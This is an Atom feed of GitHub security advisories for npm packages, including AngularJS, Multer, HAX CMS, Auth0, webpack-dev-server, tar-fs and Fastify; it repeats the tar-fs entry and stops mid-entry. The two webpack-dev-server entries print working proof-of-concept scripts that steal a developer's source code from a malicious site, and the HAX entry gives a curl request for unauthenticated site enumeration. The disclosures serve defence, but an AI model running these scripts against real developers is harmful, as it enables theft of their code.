<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-06-09T08:45:19.936Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[angular-sanitize] AngularJS Incomplete Filtering of Special Elements vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4p4w-6hg8-63wx</id>
        <link href="https://github.com/advisories/GHSA-4p4w-6hg8-63wx"/>
        <updated>2025-06-06T23:38:47.000Z</updated>
        <content type="html"><![CDATA[<p>Improper sanitization of the value of the 'href' and 'xlink:href' attributes in '<img>' SVG elements in AngularJS's&nbsp;'ngSanitize'&nbsp;module allows attackers to bypass common image source restrictions. This can lead to a form of  Content Spoofing <a href="https://owasp.org/www-community/attacks/Content_Spoofing">https://owasp.org/www-community/attacks/Content_Spoofing</a> &nbsp;and also negatively affect the application's performance and behavior by using too large or slow-to-load images.</p>
<p>This issue affects AngularJS versions greater than or equal to 1.3.1.</p>
<p>Note:
The AngularJS project is End-of-Life and will not receive any updates to address this issue. For more information see  here <a href="https://docs.angularjs.org/misc/version-support-status">https://docs.angularjs.org/misc/version-support-status</a> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2336">https://nvd.nist.gov/vuln/detail/CVE-2025-2336</a></li>
<li><a href="https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c">https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2025-2336">https://www.herodevs.com/vulnerability-directory/cve-2025-2336</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes">https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes</a></li>
<li><a href="https://github.com/advisories/GHSA-4p4w-6hg8-63wx">https://github.com/advisories/GHSA-4p4w-6hg8-63wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4p4w-6hg8-63wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[multer] Multer vulnerable to Denial of Service via unhandled exception]]></title>
        <id>https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</id>
        <link href="https://github.com/advisories/GHSA-g5hg-p3ph-g8qg"/>
        <updated>2025-06-05T01:09:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability in Multer versions &gt;=1.4.4-lts.1, &lt;2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to <code>2.0.1</code></p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a>
<a href="https://github.com/expressjs/multer/issues/1233">https://github.com/expressjs/multer/issues/1233</a>
<a href="https://github.com/expressjs/multer/pull/1256">https://github.com/expressjs/multer/pull/1256</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg">https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48997">https://nvd.nist.gov/vuln/detail/CVE-2025-48997</a></li>
<li><a href="https://github.com/expressjs/multer/issues/1233">https://github.com/expressjs/multer/issues/1233</a></li>
<li><a href="https://github.com/expressjs/multer/pull/1256">https://github.com/expressjs/multer/pull/1256</a></li>
<li><a href="https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a></li>
<li><a href="https://github.com/advisories/GHSA-g5hg-p3ph-g8qg">https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-05T01:09:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/open-apis] Unauthenticated Disclosure of PSU HAX CMS Site Listings via haxPsuUsage API Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-fvx2-x7ff-fc56</id>
        <link href="https://github.com/advisories/GHSA-fvx2-x7ff-fc56"/>
        <updated>2025-06-05T01:07:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>unauthenticated information disclosure vulnerability</strong> exists in the PSU deployment of HAX CMS via the <code>haxPsuUsage</code> API endpoint. This allows <strong>any remote unauthenticated user</strong> to retrieve a full list of PSU websites hosted on HAX CMS. When chained with other authorization issues (e.g., HAX-3), this could assist in targeted attacks such as unauthorized content modification or deletion.</p>
<hr>
<h3 id="details">Details</h3>
<p>The endpoint <a href="https://open-apis.hax.cloud/api/services/stats/haxPsuUsage"><code>https://open-apis.hax.cloud/api/services/stats/haxPsuUsage</code></a> returns a list of websites on the PSU instance of HAX CMS. This endpoint is exposed without any authentication or authorization checks.</p>
<p>The source of the issue is in the <code>haxPsuUsage.js</code> file, which appears to directly serve the site listing without verifying user identity or access level. This enables anyone with the endpoint URL to enumerate all site instances under the PSU deployment.</p>
<p>This endpoint may have originally been used for internal or statistical purposes but is now publicly accessible, representing a privacy and enumeration risk.</p>
<hr>
<h3 id="poc">PoC</h3>
<p>To reproduce this vulnerability:</p>
<ol>
<li>Open a terminal or browser.</li>
<li>Send a GET request to the following endpoint:<pre><code class="language-bash">curl https://open-apis.hax.cloud/api/services/stats/haxPsuUsage
</code></pre>
</li>
</ol>
<hr>
<h3 id="impact">Impact</h3>
<p>The <code>haxPsuUsage</code> endpoint exposes a full list of PSU HAX CMS websites to <strong>any unauthenticated user</strong>, allowing external actors to enumerate all sites under the PSU domain. This alone represents an information disclosure vulnerability.</p>
<p>When <strong>chained with the Lack Of Authorization Checks CVE</strong>, which involves missing authorization checks on key API endpoints, the risk escalates significantly. An <strong>authenticated attacker</strong> can:</p>
<ul>
<li>Modify or delete other users' sites via:<ul>
<li><code>createNode()</code>, <code>saveNode()</code>, <code>deleteNode()</code></li>
</ul>
</li>
<li>Access sensitive metadata or credentials:<ul>
<li><code>getConfig()</code>, <code>downloadSite()</code></li>
</ul>
</li>
<li>Clone or remove entire sites:<ul>
<li><code>cloneSite()</code>, <code>deleteSite()</code>, <code>archiveSite()</code></li>
</ul>
</li>
</ul>
<p>Combined, these issues allow a low-privileged user to <strong>fully compromise any site</strong> in the PSU HAX CMS instance.</p>
<p>This vulnerability chain puts <strong>content integrity, availability, and confidentiality</strong> at risk for potentially hundreds of PSU academic, instructional, and departmental sites.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56">https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48996">https://nvd.nist.gov/vuln/detail/CVE-2025-48996</a></li>
<li><a href="https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7">https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7</a></li>
<li><a href="https://github.com/advisories/GHSA-fvx2-x7ff-fc56">https://github.com/advisories/GHSA-fvx2-x7ff-fc56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fvx2-x7ff-fc56</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-05T01:07:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@auth0/nextjs-auth0] NextJS-Auth0 SDK Vulnerable to CDN Caching of Session Cookies]]></title>
        <id>https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</id>
        <link href="https://github.com/advisories/GHSA-f3fg-mf2q-fj3f"/>
        <updated>2025-06-04T22:57:22.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Overview</strong>
In Auth0 Next.js SDK versions 4.0.1 to 4.6.0, __session cookies set by auth0.middleware may be cached by CDNs due to missing Cache-Control headers.</p>
<p><strong>Am I Affected?</strong>
You are affected by this vulnerability if you meet the following preconditions:</p>
<ol>
<li>Applications using the NextJS-Auth0 SDK, versions between 4.0.1 to 4.6.0,</li>
<li>Applications using CDN or edge caching that caches responses with the Set-Cookie header.</li>
<li>If the Cache-Control header is not properly set for sensitive responses.</li>
</ol>
<p><strong>Fix</strong>
Upgrade auth0/nextjs-auth0 to v4.6.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f">https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f</a></li>
<li><a href="https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e">https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48947">https://nvd.nist.gov/vuln/detail/CVE-2025-48947</a></li>
<li><a href="https://github.com/advisories/GHSA-f3fg-mf2q-fj3f">https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-04T21:24:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack-dev-server] webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser]]></title>
        <id>https://github.com/advisories/GHSA-9jgg-88mc-972h</id>
        <link href="https://github.com/advisories/GHSA-9jgg-88mc-972h"/>
        <updated>2025-06-04T21:09:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Source code may be stolen when you access a malicious web site with non-Chromium based browser.</p>
<h3 id="details">Details</h3>
<p>The <code>Origin</code> header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.
But webpack-dev-server always allows IP address <code>Origin</code> headers.
<a href="https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a>
This allows websites that are served on IP addresses to connect WebSocket.
By using the same method described in <a href="https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages">the article</a> linked from CVE-2018-14732, the attacker get the source code.</p>
<p>related commit: <a href="https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a> (note that <code>checkHost</code> function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.</p>
<p>This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/blog/private-network-access-update#chrome_94">the non-HTTPS private access blocking feature</a>.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18418233/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>http://{ipaddress}/?target=http://localhost:8080&amp;file=main</code> with a non-Chromium browser (I used Firefox 134.0.1)</li>
<li>Edit <code>src/index.js</code> in the extracted directory</li>
<li>You can see the content of <code>src/index.js</code></li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">window.webpackHotUpdate = (...args) =&gt; {
    console.log(...args);
    for (i in args[1]) {
        document.body.innerText = args[1][i].toString() + document.body.innerText
        console.log(args[1][i])
    }
}

let params = new URLSearchParams(window.location.search);
let target = new URL(params.get('target') || 'http://127.0.0.1:8080');
let file = params.get('file')
let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';
let wsPort = target.port;
var currentHash = '';
var currentHash2 = '';
let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;
ws = new WebSocket(wsTarget);
ws.onmessage = event =&gt; {
    console.log(event.data);
    if (event.data.match('"type":"ok"')) {
        s = document.createElement('script');
        s.src = `${target}${file}.${currentHash2}.hot-update.js`;
        document.body.appendChild(s)
    }
    r = event.data.match(/"([0-9a-f]{20})"/);
    if (r !== null) {
        currentHash2 = currentHash;
        currentHash = r[1];
        console.log(currentHash, currentHash2);
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h">https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30360">https://nvd.nist.gov/vuln/detail/CVE-2025-30360</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239">https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a></li>
<li><a href="https://github.com/advisories/GHSA-9jgg-88mc-972h">https://github.com/advisories/GHSA-9jgg-88mc-972h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jgg-88mc-972h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:09:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack-dev-server] webpack-dev-server users' source code may be stolen when they access a malicious web site]]></title>
        <id>https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</id>
        <link href="https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"/>
        <updated>2025-06-04T21:09:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Source code may be stolen when you access a malicious web site.</p>
<h3 id="details">Details</h3>
<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:8080/main.js"&gt;</code> in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.
By using <code>Function::toString</code> against the values in <code>__webpack_modules__</code>, the attacker can get the source code.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18426585/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/</code></li>
<li>You can see the source code output in the document and the devtools console.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">let moduleList
const onHandlerSet = (handler) =&gt; {
  console.log('h', handler)
  moduleList = handler.require.m
}

const originalArrayForEach = Array.prototype.forEach
Array.prototype.forEach = function forEach(callback, thisArg) {
  callback((handler) =&gt; {
    onHandlerSet(handler)
  })
  originalArrayForEach.call(this, callback, thisArg)
  Array.prototype.forEach = originalArrayForEach
}

const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
  console.log(moduleList)
  for (const key in moduleList) {
    const p = document.createElement('p')
    const title = document.createElement('strong')
    title.textContent = key
    const code = document.createElement('code')
    code.textContent = moduleList[key].toString()
    p.append(title, ':', document.createElement('br'), code)
    document.body.appendChild(p)
  }
})
document.head.appendChild(script)
</code></pre>
<p>This script uses the function generated by <a href="https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383"><code>renderRequire</code></a>.</p>
<pre><code class="language-js">    // The require function
    function __webpack_require__(moduleId) {
        // Check if module is in cache
        var cachedModule = __webpack_module_cache__[moduleId];
        if (cachedModule !== undefined) {
            return cachedModule.exports;
        }
        // Create a new module (and put it into the cache)
        var module = __webpack_module_cache__[moduleId] = {
            // no module.id needed
            // no module.loaded needed
            exports: {}
        };
        // Execute the module function
        var execOptions = {
            id: moduleId,
            module: module,
            factory: __webpack_modules__[moduleId],
            require: __webpack_require__
        };
        __webpack_require__.i.forEach(function(handler) {
            handler(execOptions);
        });
        module = execOptions.module;
        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);
        // Return the exports of the module
        return module.exports;
    }
</code></pre>
<p>Especially, it uses the fact that <code>Array::forEach</code> is called for <code>__webpack_require__.i</code> and <code>execOptions</code> contains <code>__webpack_require__</code>.
It uses prototype pollution against <code>Array::forEach</code> to extract <code>__webpack_require__</code> reference.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.</p>
<details>
<summary>Old content</summary>

<h3 id="summary-1">Summary</h3>
<p>Source code may be stolen when you use <a href="https://webpack.js.org/configuration/output/#outputiife"><code>output.iife: false</code></a> and access a malicious web site.</p>
<h3 id="details-1">Details</h3>
<p>When <code>output.iife: false</code> is set, some global variables for the webpack runtime are declared on the <code>window</code> object (e.g. <code>__webpack_modules__</code>).
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:8080/main.js"&gt;</code> in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the <code>window</code> object.
By using <code>Function::toString</code> against the values in <code>__webpack_modules__</code>, the attacker can get the source code.</p>
<p>I pointed out <code>output.iife: false</code>, but if there are other options that makes the webpack runtime variables to be declared on the <code>window</code> object, the same will apply for those cases.</p>
<h3 id="poc-1">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18409777/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/</code></li>
<li>Open the devtools console.</li>
<li>You can see the content of <code>src/index.js</code> and other scripts loaded.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
    for (const module in window.__webpack_modules__) {
        console.log(`${module}:`, window.__webpack_modules__[module].toString())
    }
})
document.head.appendChild(script)
</code></pre>
<h3 id="impact-1">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that has <code>output.iife: false</code> option set and uses a predictable port and output path for the entrypoint script.</p>
</details>
### References

<ul>
<li><a href="https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v">https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30359">https://nvd.nist.gov/vuln/detail/CVE-2025-30359</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e">https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e</a></li>
<li><a href="https://github.com/advisories/GHSA-4v9v-hfq4-rm2v">https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:09:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastify] Fastify vulnerable to invalid content-type parsing, which could lead to validation bypass]]></title>
        <id>https://github.com/advisories/GHSA-mg2h-6x62-wpwc</id>
        <link href="https://github.com/advisories/GHSA-mg2h-6x62-wpwc"/>
        <updated>2025-05-29T21:04:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In applications that specify different validation strategies for different content types, it's possible to bypass the validation by providing a <em>slightly altered</em> content type such as with different casing or altered whitespacing before <code>;</code>.</p>
<p>Users using the the following pattern are affected:</p>
<pre><code class="language-js">fastify.post('/', {
  handler(request, reply) {
    reply.code(200).send(request.body)
  },
  schema: {
    body: {
      content: {
        'application/json': {
          schema: {
            type: 'object',
            properties: {
              'foo': {
                type: 'string',
              }
            },
            required: ['foo']
          }
        },
      }
    }
  }
})
</code></pre>
<p>User using the following pattern are <strong>not</strong> affected:</p>
<pre><code class="language-js">fastify.post('/', {
  handler(request, reply) {
    reply.code(200).send(request.body)
  },
  schema: {
    body: {
      type: 'object',
      properties: {
        'foo': {
          type: 'string',
        }
      },
      required: ['foo']
    }
  }
})
</code></pre>
<h3 id="patches">Patches</h3>
<p>This was patched in v5.3.1, but unfortunately it did not cover all problems. This has been fully patched in v5.3.2.
Version v4.9.0 was also affected by this issue. This has been fully patched in v4.9.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not specify multiple content types in the schema.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p><a href="https://hackerone.com/reports/3087928">https://hackerone.com/reports/3087928</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc">https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc</a></li>
<li><a href="https://github.com/fastify/fastify/commit/436da4c06dfbbb8c24adee3a64de0c51e4f47418">https://github.com/fastify/fastify/commit/436da4c06dfbbb8c24adee3a64de0c51e4f47418</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32442">https://nvd.nist.gov/vuln/detail/CVE-2025-32442</a></li>
<li><a href="https://hackerone.com/reports/3087928">https://hackerone.com/reports/3087928</a></li>
<li><a href="https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4">https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4</a></li>
